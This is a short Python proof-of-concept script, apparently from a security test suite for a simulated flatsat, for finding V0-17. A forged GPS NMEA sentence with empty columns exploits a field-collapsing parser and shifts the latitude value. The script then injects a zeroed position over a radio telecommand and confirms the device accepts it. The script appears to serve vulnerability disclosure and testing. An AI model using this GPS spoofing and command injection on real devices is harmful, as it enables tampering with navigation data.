#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


def main(dev, ev):
    # V0-17: the NMEA parser uses strtok-like splitting: consecutive empty
    # fields collapse, so a forged sentence with empty columns shifts every
    # later value one column left. The device has no checksum to blame.
    # Replaying the firmware column algorithm (firmware/sensors.cpp
    # gpsSplitLine: strsep-style collapse of adjacent delimiters):
    def parse(sentence):
        fields = [f for f in sentence.split(",") if f != ""]  # the bug
        return fields
    good = parse("123519,A,3606.1699,N,11508.3880,W,0.0,0.0,220426,,,A")
    forged = parse("123519,A,,N,,W,0.0,0.0,220426,,,A")
    ev.log(f"good sentence  -> lat field = {good[2]!r}")
    ev.log(f"forged sentence -> lat field = {forged[2]!r}  (shifted!)")
    check(good[2] != forged[2], "empty columns must shift the lat column")
    # and the device trusts whatever the parser produced (see V0-05): feed
    # the shifted value straight through the injection hook
    import struct
    pay = struct.pack("<iiiB", 0, 0, 0, 0)   # parser gave zeroes
    tms = dev.tc(0x14, pay, via="radio")
    tms = dev.tc(0x0E, b"", via="usb")
    nav = dev.find(tms, 0x0E)[0]
    check(nav.le32(3) == 0, "shifted (zero) position accepted without complaint")
    ev.log("zeroed/shifted position trusted -- no integrity layer to object")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V0-17 NMEA column shift via collapsing split", main))
